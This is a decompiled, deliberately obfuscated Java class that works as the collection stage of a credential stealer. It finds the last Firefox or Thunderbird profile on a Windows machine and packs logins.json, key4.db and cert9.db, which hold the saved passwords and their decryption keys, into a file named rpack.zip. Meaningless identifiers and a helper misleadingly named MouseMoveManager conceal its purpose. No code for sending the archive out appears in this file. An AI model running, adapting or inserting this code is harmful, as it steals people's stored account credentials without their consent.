package carLambo;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class dncbnf {
   String sdfsldf = null;
   private boolean dfhttegd = false;
   boolean sabretb = false;

   // $FF: synthetic method
   private String dfhttegd() {
      return this.dfhttegd ? (new StringBuilder()).insert(0, System.getProperty("user.home")).append("\\AppData\\Roaming\\Thunderbird").toString() : (new StringBuilder()).insert(0, System.getProperty("user.home")).append("\\AppData\\Roaming\\Mozilla\\Firefox").toString();
   }

   // $FF: synthetic method
   private static void sdfsldf(FileInputStream var0, ZipOutputStream var1) {
      byte[] var2 = new byte[8192];

      try {
         int var3;
         for(FileInputStream var10000 = var0; (var3 = var10000.read(var2, 0, 8192)) != -1; var10000 = var0) {
            var1.write(var2, 0, var3);
            var1.flush();
         }

         var0.close();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }


   }

   public final boolean sdfsldf() {
      return this.sabretb;
   }

   // $FF: synthetic method
   private String sdfsldf(File var1, File var2, File var3) {
      ZipOutputStream var4 = null;

      String var16;
      label67: {
         try {
            try {
               String var5 = (new StringBuilder()).insert(0, this.sdfsldf).append("\\rpack.zip").toString();
               var4 = new ZipOutputStream(new FileOutputStream(new File(var5)));
               var4.putNextEntry(new ZipEntry(var1.getName()));
               sdfsldf(new FileInputStream(var1), var4);
               var4.closeEntry();
               var4.putNextEntry(new ZipEntry(var2.getName()));
               sdfsldf(new FileInputStream(var2), var4);
               var4.closeEntry();
               var4.putNextEntry(new ZipEntry(var3.getName()));
               sdfsldf(new FileInputStream(var3), var4);
               var4.closeEntry();
               var4.close();
               this.sabretb = true;
               var16 = var5;
               break label67;
            } catch (Exception var14) {
               Logger.getLogger(dncbnf.class.getName()).log(Level.SEVERE, (String)null, var14);
            }
         } catch (Throwable var15) {
            Throwable var10000;
            try {
               var4.close();
            } catch (IOException var13) {
               Logger.getLogger(dncbnf.class.getName()).log(Level.SEVERE, (String)null, var13);
               var10000 = var15;
               throw new RuntimeException(var10000);
            }

            var10000 = var15;
            throw new RuntimeException(var10000);
         }

         try {
            var4.close();
            return null;
         } catch (IOException var11) {
            Logger.getLogger(dncbnf.class.getName()).log(Level.SEVERE, (String)null, var11);
            return null;
         }
      }

      try {
         var4.close();
         return var16;
      } catch (IOException var12) {
         Logger.getLogger(dncbnf.class.getName()).log(Level.SEVERE, (String)null, var12);
         return var16;
      }
   }

   dncbnf(boolean var1) {
      this.dfhttegd = var1;
      this.bsgshsbs();
   }

   // $FF: synthetic method
   private void bsgshsbs() {
      try {
         String var1 = this.dfhttegd ? (new StringBuilder()).insert(0, System.getProperty("user.home")).append("\\AppData\\Roaming\\Thunderbird").toString() : (new StringBuilder()).insert(0, System.getProperty("user.home")).append("\\AppData\\Roaming\\Mozilla\\Firefox").toString();
         MouseMoveManager var2 = new MouseMoveManager((new StringBuilder()).insert(0, var1).append("\\profiles.ini").toString());
         ArrayList var3 = new ArrayList();
         Iterator var4 = var2.sdfsldf().iterator();

         while(var4.hasNext()) {
            String var5;
            if ((var5 = (String)var4.next()).startsWith("Profile")) {
               var3.add(var5);
            }
         }

         if (var3.size() > 0) {
            String var9 = var2.sdfsldf((String)var3.get(var3.size() - 1), "Path", (String)null);
            var9 = (new StringBuilder()).insert(0, var1).append("\\").append(var9.replace("/", "\\")).toString();
            File var10 = new File((new StringBuilder()).insert(0, var9).append("\\logins.json").toString());
            File var7 = new File((new StringBuilder()).insert(0, var9).append("\\key4.db").toString());
            File var8 = new File((new StringBuilder()).insert(0, var9).append("\\cert9.db").toString());
            if (var10.exists() && var7.exists() && var8.exists()) {
               this.sdfsldf = var9;
               this.sdfsldf = this.sdfsldf(var10, var7, var8);
               return;
            }
         }
      } catch (Exception var6) {
         Logger.getLogger(dncbnf.class.getName()).log(Level.SEVERE, (String)null, var6);
      }

   }

   public final String sabretb() {
      return this.sdfsldf;
   }
}
